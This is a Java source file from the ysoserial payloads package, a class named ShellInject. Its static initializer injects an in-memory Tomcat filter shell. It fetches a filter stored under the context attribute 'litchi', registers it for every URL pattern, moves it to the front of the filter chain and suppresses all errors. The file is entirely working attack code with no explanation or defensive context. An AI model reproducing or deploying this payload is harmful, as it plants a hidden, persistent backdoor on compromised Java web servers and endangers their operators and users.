package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;

public class ShellInject  {
    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
            Filter filter = (Filter) applicationContext.getAttribute("litchi");

            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName("litchi");
            filterDef.setFilterClass(filter.getClass().getName());
            filterDef.setFilter(filter);
            StandardContext standardContext = ((StandardContext)webappClassLoaderBase.getResources().getContext());
            standardContext.addFilterDef(filterDef);
            standardContext.filterStart();
            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName("litchi");
            filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));
            filterMap.addURLPattern("/*");
            standardContext.addFilterMap(filterMap);
            for (int i = 0; i < filterMaps.length; i++) {
                if (filterMaps[i].getFilterName().equalsIgnoreCase("litchi")) {
                    org.apache.tomcat.util.descriptor.web.FilterMap tempFilterMap = filterMaps[i];
                    filterMaps[i] = filterMaps[0];
                    filterMaps[0] = filterMap;
                    break;
                }
            }
        } catch (Exception e) {
        }
    }

}
